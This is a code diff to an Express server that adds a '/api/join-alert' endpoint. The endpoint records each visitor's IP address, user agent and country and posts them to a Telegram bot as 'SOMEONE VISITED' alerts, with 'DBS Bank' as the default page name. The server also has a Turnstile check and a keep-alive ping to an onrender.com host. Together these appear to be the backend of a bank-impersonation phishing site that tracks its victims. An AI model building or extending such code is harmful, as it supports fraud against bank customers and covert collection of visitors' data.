@@ -68,6 +68,72 @@ app.post('/verify-turnstile', async (req, res) => {
 
 
 
+
+
+
+// ─── TELEGRAM JOIN ALERT ────────────────────────────────────────────
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+function getClientInfo(req) {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim()
+        || req.headers['x-real-ip']
+        || req.connection.remoteAddress
+        || req.socket.remoteAddress
+        || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    return { ip, userAgent };
+}
+
+async function getCountry(ip) {
+    if (ip === 'Unknown' || ip === '127.0.0.1') return 'Local';
+    try {
+        const r = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode,country`);
+        const d = await r.json();
+        return d.country || d.countryCode || 'Unknown';
+    } catch {
+        return 'Unknown';
+    }
+}
+
+async function sendTelegram(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        console.log('[+] Telegram sent');
+    } catch (e) {
+        console.log('[-] Telegram failed:', e.message);
+    }
+}
+
+app.post('/api/join-alert', async (req, res) => {
+    const { ip, userAgent } = getClientInfo(req);
+    const country = await getCountry(ip);
+    const page = req.body?.page || 'DBS Bank';
+
+    sendTelegram(`
+🏦 <b>SOMEONE VISITED ${page.toUpperCase()}</b>
+
+🌍 Country: <code>${country}</code>
+🌐 IP: <code>${ip}</code>
+📱 User-Agent: <code>${userAgent}</code>
+🕒 Time: ${new Date().toLocaleString()}
+    `.trim());
+
+    res.json({ ok: true });
+});
+
+
+
+
+
 // ─── AUTO-PING EVERY 10 MINUTES ───
 setInterval(() => {
   https.get('https://assignmentdbs-1.onrender.com', (res) => {
